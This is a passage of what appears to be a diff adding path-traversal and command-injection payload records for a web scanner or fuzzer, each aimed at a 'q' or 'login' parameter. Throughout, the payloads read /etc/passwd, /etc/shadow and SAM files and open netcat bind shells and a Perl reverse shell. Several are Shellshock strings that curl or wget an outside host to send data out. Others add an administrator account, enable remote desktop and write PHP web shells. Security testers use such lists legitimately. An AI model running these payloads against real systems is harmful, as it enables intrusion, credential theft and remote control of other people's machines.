AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-eab693cd-q", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-eab693cd-login", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-1853a48a-q", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\..\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1853a48a-login", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\..\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-25a80022-q", "payload": "C:/inetpub/wwwroot/global.asa", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-25a80022-login", "payload": "C:/inetpub/wwwroot/global.asa", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-8cf36b00-q", "payload": "\\../\\../\\../\\../\\..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-8cf36b00-login", "payload": "\\../\\../\\../\\../\\..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-7c976826-q", "payload": "\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-7c976826-login", "payload": "\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "command-injection-fa5b7c24-q", "payload": "\" & whoami", "injection_point": "q", "fragment": true}
+{"id": "command-injection-fa5b7c24-login", "payload": "\" & whoami", "injection_point": "login", "fragment": true}
+{"id": "command-injection-1e13eaeb-q", "payload": "\" && whoami", "injection_point": "q", "fragment": true}
+{"id": "command-injection-1e13eaeb-login", "payload": "\" && whoami", "injection_point": "login", "fragment": true}
+{"id": "command-injection-6b31c08e-q", "payload": "\" whoami", "injection_point": "q", "fragment": true}
+{"id": "command-injection-6b31c08e-login", "payload": "\" whoami", "injection_point": "login", "fragment": true}
+{"id": "command-injection-a88d9403-q", "payload": "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a88d9403-login", "payload": "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "injection_point": "login", "fragment": false}
+{"id": "command-injection-56d0de2b-q", "payload": "$(`dir`)", "injection_point": "q", "fragment": true}
+{"id": "command-injection-56d0de2b-login", "payload": "$(`dir`)", "injection_point": "login", "fragment": true}
+{"id": "command-injection-fea31518-q", "payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "injection_point": "q", "fragment": false}
+{"id": "command-injection-fea31518-login", "payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "injection_point": "login", "fragment": false}
+{"id": "command-injection-e328163e-q", "payload": "${@print(\"RCEVulnerable\")}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-e328163e-login", "payload": "${@print(\"RCEVulnerable\")}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-db5bb626-q", "payload": "%0A/usr/bin/id%0A", "injection_point": "q", "fragment": false}
+{"id": "command-injection-db5bb626-login", "payload": "%0A/usr/bin/id%0A", "injection_point": "login", "fragment": false}
+{"id": "command-injection-036c522d-q", "payload": "%0a id %0a", "injection_point": "q", "fragment": false}
+{"id": "command-injection-036c522d-login", "payload": "%0a id %0a", "injection_point": "login", "fragment": false}
+{"id": "command-injection-34ddbb96-q", "payload": "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1", "injection_point": "q", "fragment": false}
+{"id": "command-injection-34ddbb96-login", "payload": "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1", "injection_point": "login", "fragment": false}
+{"id": "command-injection-18140e90-q", "payload": "%20{${phpinfo()}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-18140e90-login", "payload": "%20{${phpinfo()}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-7bb541c1-q", "payload": "%20{${sleep(20)}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-7bb541c1-login", "payload": "%20{${sleep(20)}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ea885b41-q", "payload": "& curl http://crowdshield.com/.testing/rce.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ea885b41-login", "payload": "& curl http://crowdshield.com/.testing/rce.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-dc2932d5-q", "payload": "& dir C:\\Documents and Settings\\*", "injection_point": "q", "fragment": false}
+{"id": "command-injection-dc2932d5-login", "payload": "& dir C:\\Documents and Settings\\*", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1e054ad2-q", "payload": "& dir C:\\Users", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1e054ad2-login", "payload": "& dir C:\\Users", "injection_point": "login", "fragment": false}
+{"id": "command-injection-a647d1ef-q", "payload": "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php ", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a647d1ef-login", "payload": "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php ", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f48aa068-q", "payload": "& id", "injection_point": "q", "fragment": true}
+{"id": "command-injection-f48aa068-login", "payload": "& id", "injection_point": "login", "fragment": true}
+{"id": "command-injection-f8e775db-q", "payload": "& ls -l /", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f8e775db-login", "payload": "& ls -l /", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b5c67a4e-q", "payload": "& ls -l /tmp", "injection_point": "q", "fragment": false}
+{"id": "command-injection-b5c67a4e-login", "payload": "& ls -l /tmp", "injection_point": "login", "fragment": false}
+{"id": "command-injection-42f6f224-q", "payload": "& nc -lvvp 4444 -e /bin/sh&", "injection_point": "q", "fragment": false}
+{"id": "command-injection-42f6f224-login", "payload": "& nc -lvvp 4444 -e /bin/sh&", "injection_point": "login", "fragment": false}
+{"id": "command-injection-0d78fbef-q", "payload": "& netstat -an", "injection_point": "q", "fragment": false}
+{"id": "command-injection-0d78fbef-login", "payload": "& netstat -an", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f7d36638-q", "payload": "& pwd", "injection_point": "q", "fragment": true}
+{"id": "command-injection-f7d36638-login", "payload": "& pwd", "injection_point": "login", "fragment": true}
+{"id": "command-injection-1bff845a-q", "payload": "& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1bff845a-login", "payload": "& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "injection_point": "login", "fragment": false}
+{"id": "command-injection-af3a5269-q", "payload": "& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-af3a5269-login", "payload": "& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f46c4993-q", "payload": "& type C:\\Windows\\repair\\SAM", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f46c4993-login", "payload": "& type C:\\Windows\\repair\\SAM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-2258e14d-q", "payload": "&& ", "injection_point": "q", "fragment": true}
+{"id": "command-injection-2258e14d-login", "payload": "&& ", "injection_point": "login", "fragment": true}
+{"id": "command-injection-d090c063-q", "payload": "&& curl https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-d090c063-login", "payload": "&& curl https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b336a991-q", "payload": "&& dir", "injection_point": "q", "fragment": true}
+{"id": "command-injection-b336a991-login", "payload": "&& dir", "injection_point": "login", "fragment": true}
+{"id": "command-injection-ae105740-q", "payload": "&& dir C:\\", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ae105740-login", "payload": "&& dir C:\\", "injection_point": "login", "fragment": false}
+{"id": "command-injection-6f90bbaf-q", "payload": "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "q", "fragment": false}
+{"id": "command-injection-6f90bbaf-login", "payload": "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "login", "fragment": false}
+{"id": "command-injection-cd3079a9-q", "payload": "&& ifconfig", "injection_point": "q", "fragment": true}
+{"id": "command-injection-cd3079a9-login", "payload": "&& ifconfig", "injection_point": "login", "fragment": true}
+{"id": "command-injection-92cf7042-q", "payload": "&& ls -l /home/*", "injection_point": "q", "fragment": false}
+{"id": "command-injection-92cf7042-login", "payload": "&& ls -l /home/*", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b7d300d0-q", "payload": "&& nc -lvvp 4444 -e /bin/sh &", "injection_point": "q", "fragment": false}
+{"id": "command-injection-b7d300d0-login", "payload": "&& nc -lvvp 4444 -e /bin/sh &", "injection_point": "login", "fragment": false}
+{"id": "command-injection-941c3749-q", "payload": "&& net user hacker Password1 /ADD", "injection_point": "q", "fragment": false}
+{"id": "command-injection-941c3749-login", "payload": "&& net user hacker Password1 /ADD", "injection_point": "login", "fragment": false}
+{"id": "command-injection-5290ab1a-q", "payload": "&& perl -e 'print \"X\"x2048'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-5290ab1a-login", "payload": "&& perl -e 'print \"X\"x2048'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-6096d363-q", "payload": "&& perl -e 'print \"X\"x8096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-6096d363-login", "payload": "&& perl -e 'print \"X\"x8096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-edd1a45b-q", "payload": "&& sleep 1", "injection_point": "q", "fragment": false}
+{"id": "command-injection-edd1a45b-login", "payload": "&& sleep 1", "injection_point": "login", "fragment": false}
+{"id": "command-injection-55090590-q", "payload": "&& sleep 15", "injection_point": "q", "fragment": false}
+{"id": "command-injection-55090590-login", "payload": "&& sleep 15", "injection_point": "login", "fragment": false}
+{"id": "command-injection-05a10ef9-q", "payload": "&& sysinfo", "injection_point": "q", "fragment": true}
+{"id": "command-injection-05a10ef9-login", "payload": "&& sysinfo", "injection_point": "login", "fragment": true}
+{"id": "command-injection-e1e36844-q", "payload": "&& uname -a", "injection_point": "q", "fragment": false}
+{"id": "command-injection-e1e36844-login", "payload": "&& uname -a", "injection_point": "login", "fragment": false}
+{"id": "command-injection-c3325da2-q", "payload": "&& wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-c3325da2-login", "payload": "&& wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ed25849d-q", "payload": "&&id", "injection_point": "q", "fragment": true}
+{"id": "command-injection-ed25849d-login", "payload": "&&id", "injection_point": "login", "fragment": true}
+{"id": "command-injection-a2ff36ad-q", "payload": "&&type C:\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a2ff36ad-login", "payload": "&&type C:\\\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "command-injection-265fda17-q", "payload": "'", "injection_point": "q", "fragment": true}
+{"id": "command-injection-265fda17-login", "payload": "'", "injection_point": "login", "fragment": true}
+{"id": "command-injection-946f7b8a-q", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-946f7b8a-login", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-51c77066-q", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-51c77066-login", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-bb18285d-q", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-bb18285d-login", "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-79141d7f-q", "payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-79141d7f-login", "payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-124a2251-q", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\`pwd\\`\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-124a2251-login", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\`pwd\\`\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9edda7fb-q", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root /etc/shadow\\`\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-9edda7fb-login", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root /etc/shadow\\`\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-4bfc8ea1-q", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\`uname -a\\`\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-4bfc8ea1-login", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\`uname -a\\`\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f5647ccd-q", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f5647ccd-login", "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"", "injection_point": "login", "fragment": false}
+{"id": "command-injection-cfb6b9f0-q", "payload": "() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11", "injection_point": "q", "fragment": false}
+{"id": "command-injection-cfb6b9f0-login", "payload": "() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f04e590a-q", "payload": "() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\\\");'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f04e590a-login", "payload": "() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\\\");'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-2692182d-q", "payload": "*; ls -lhtR /var/www/", "injection_point": "q", "fragment": false}
+{"id": "command-injection-2692182d-login", "payload": "*; ls -lhtR /var/www/", "injection_point": "login", "fragment": false}
+{"id": "command-injection-fb4c230b-q", "payload": ":phpversion();", "injection_point": "q", "fragment": true}
+{"id": "command-injection-fb4c230b-login", "payload": ":phpversion();", "injection_point": "login", "fragment": true}
+{"id": "command-injection-ed39eccf-q", "payload": "; dir C:\\", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ed39eccf-login", "payload": "; dir C:\\", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f132167b-q", "payload": "; echo \"<?php include($_GET['page']); ?>\" > rfi.php", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f132167b-login", "payload": "; echo \"<?php include($_GET['page']); ?>\" > rfi.php", "injection_point": "login", "fragment": false}
+{"id": "command-injection-816a2b9e-q", "payload": "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "q", "fragment": false}
+{"id": "command-injection-816a2b9e-login", "payload": "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "login", "fragment": false}
+{"id": "command-injection-700a78dc-q", "payload": "; ipconfig /all", "injection_point": "q", "fragment": false}
+{"id": "command-injection-700a78dc-login", "payload": "; ipconfig /all", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ea3a62c7-q", "payload": "; ls -l /", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ea3a62c7-login", "payload": "; ls -l /", "injection_point": "login", "fragment": false}
+{"id": "command-injection-58bc2ebf-q", "payload": "; ls -l /home/*", "injection_point": "q", "fragment": false}
+{"id": "command-injection-58bc2ebf-login", "payload": "; ls -l /home/*", "injection_point": "login", "fragment": false}
+{"id": "command-injection-c479cd7c-q", "payload": "; ls -laR /etc", "injection_point": "q", "fragment": false}
+{"id": "command-injection-c479cd7c-login", "payload": "; ls -laR /etc", "injection_point": "login", "fragment": false}
+{"id": "command-injection-e1e4f45d-q", "payload": "; net localgroup Administrators hacker /ADD", "injection_point": "q", "fragment": false}
+{"id": "command-injection-e1e4f45d-login", "payload": "; net localgroup Administrators hacker /ADD", "injection_point": "login", "fragment": false}
+{"id": "command-injection-a95a6c2d-q", "payload": "; net user hacker Password1 /ADD", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a95a6c2d-login", "payload": "; net user hacker Password1 /ADD", "injection_point": "login", "fragment": false}
+{"id": "command-injection-46b48038-q", "payload": "; perl -e 'print \"X\"x4096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-46b48038-login", "payload": "; perl -e 'print \"X\"x4096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9255e799-q", "payload": "; pwd", "injection_point": "q", "fragment": true}
+{"id": "command-injection-9255e799-login", "payload": "; pwd", "injection_point": "login", "fragment": true}
+{"id": "command-injection-cd9eace2-q", "payload": "; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "injection_point": "q", "fragment": false}
+{"id": "command-injection-cd9eace2-login", "payload": "; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1f1f8630-q", "payload": "; sleep 5", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1f1f8630-login", "payload": "; sleep 5", "injection_point": "login", "fragment": false}
+{"id": "command-injection-207db018-q", "payload": "; system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-207db018-login", "payload": "; system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ecb32a80-q", "payload": "; type %SYSTEMROOT%\\repair\\SAM", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ecb32a80-login", "payload": "; type %SYSTEMROOT%\\repair\\SAM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1079f1c2-q", "payload": "; type %SYSTEMROOT%\\repair\\SYSTEM", "injection_point": "q", "fragment": false}
